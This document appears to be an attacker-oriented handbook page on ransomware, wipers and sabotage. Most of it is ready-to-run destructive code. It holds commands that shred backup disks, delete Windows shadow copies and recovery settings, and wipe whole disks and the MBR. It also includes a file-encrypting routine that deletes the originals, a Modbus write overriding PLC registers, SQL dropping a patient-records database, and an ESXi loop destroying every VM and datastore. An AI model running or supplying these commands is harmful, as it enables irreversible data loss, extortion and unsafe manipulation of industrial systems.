# Data destruction and operational disruption

Ransomware, wipers, and critical system manipulation used to render systems
unusable or maximise pressure during extortion. This page covers the
technical mechanisms; the operational context is in the
[ransomware campaign runbook](../runbooks/ransomware-campaign.md).

## Ransomware: what modern variants do

Modern ransomware is not a single tool. It is a sequence of actions:

1. Enumerate and prioritise targets: databases, VM disks, backup repositories
2. Disable or destroy backups before deploying encryption
3. Exfiltrate data (covered in the exfiltration section)
4. Encrypt target files
5. Establish a ransom communication channel

The sequencing matters. Destroying backups before encryption removes the
recovery path. Exfiltrating before encrypting enables extortion even if
the victim restores from backup.

### Backup destruction

```bash
# Linux: destroy backup storage before ransomware deployment
# target Veeam or Rubrik backup repositories
shred -n 3 -u /dev/sdX  # overwrite entire backup disk

# delete backup catalogues
find /backups -type f -exec shred -n 1 -u {} \;

# if backup software is accessible:
# Veeam: delete backup jobs and repositories from the management console
# or kill the Veeam services and delete the repository paths
```

```powershell
# Windows: disable shadow copies and recovery tools before encryption
vssadmin delete shadows /all /quiet
bcdedit /set {default} recoveryenabled no
wbadmin delete catalog -quiet
# disable System Restore
Disable-ComputerRestore -Drive 'C:\'
```

### File encryption patterns

Ransomware typically encrypts by:
- Generating a per-file or per-host symmetric key
- Encrypting the key with the attacker's public key (the attacker's private
  key is needed to decrypt)
- Appending a ransom note

```python
# simplified encryption pattern (for testing/simulation only)
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
import os, json

def encrypt_file(filepath, aes_key, aes_iv):
    with open(filepath, 'rb') as f:
        plaintext = f.read()
    cipher = Cipher(algorithms.AES(aes_key), modes.CFB(aes_iv),
                    backend=default_backend())
    enc = cipher.encryptor()
    ciphertext = enc.update(plaintext) + enc.finalize()
    with open(filepath + '.enc', 'wb') as f:
        f.write(ciphertext)
    os.remove(filepath)
```

### Triple extortion structure

| Stage | Action                                         | Leverage                                |
|-------|------------------------------------------------|-----------------------------------------|
| 1     | Exfiltrate sensitive data                      | Threat to publish regardless of payment |
| 2     | Encrypt production systems                     | Operational disruption pressure         |
| 3     | DDoS public-facing services during negotiation | Reputational and customer pressure      |

## Disk wiping

Wipers are used for sabotage rather than extortion. The goal is permanent
data destruction without recovery:

```bash
# Linux: overwrite entire disk with random data
dd if=/dev/urandom of=/dev/sda bs=4M status=progress

# targeted: overwrite specific partitions
dd if=/dev/urandom of=/dev/sda1 bs=4M

# shred: multiple passes with verification
shred -n 10 -v /dev/sda
```

```powershell
# Windows: DoD-grade wipe using cipher
cipher /w:C

# alternative: overwrite the MBR to prevent booting
dd if=/dev/zero of=\\.\PhysicalDrive0 bs=512 count=1  # (Windows dd variant)
```

## Critical infrastructure and SCADA targets

ICS/SCADA attacks manipulate physical processes. The techniques are
environment-specific; the general pattern is:

- Gain access to the engineering workstation or SCADA HMI
- Understand the process being controlled (read the historian data)
- Identify safety-critical setpoints or interlocks
- Send commands that move setpoints outside safe operating ranges, or
  disable safety interlocks

```python
# Modbus TCP: force output registers to override PLC state
from pymodbus.client import ModbusTcpClient

client = ModbusTcpClient('PLC_IP', port=502)
client.connect()
# write registers: exact register addresses depend on the target PLC configuration
client.write_registers(address=100, values=[0xFFFF], unit=1)
client.close()
```

## Database destruction

```
-- SQL Server: drop database with no recovery option
-- requires ALTER DATABASE permissions
ALTER DATABASE patient_records SET SINGLE_USER WITH ROLLBACK IMMEDIATE;
DROP DATABASE patient_records;

-- PostgreSQL: drop all tables in the public schema
DO $$ DECLARE
  r RECORD;
BEGIN
  FOR r IN (SELECT tablename FROM pg_tables WHERE schemaname = 'public') LOOP
    EXECUTE 'DROP TABLE IF EXISTS ' || quote_ident(r.tablename) || ' CASCADE';
  END LOOP;
END $$;
```

## Impact on virtual infrastructure

Hypervisor-level destruction affects all guest VMs simultaneously:

```bash
# VMware ESXi: destroy all VMs from the command line
for vm in $(vim-cmd vmsvc/getallvms | awk '{print $1}' | grep -E '^[0-9]+'); do
    vim-cmd vmsvc/power.off $vm 2>/dev/null
    vim-cmd vmsvc/destroy $vm 2>/dev/null
done
# or destroy the datastore itself
rm -rf /vmfs/volumes/datastore/
```
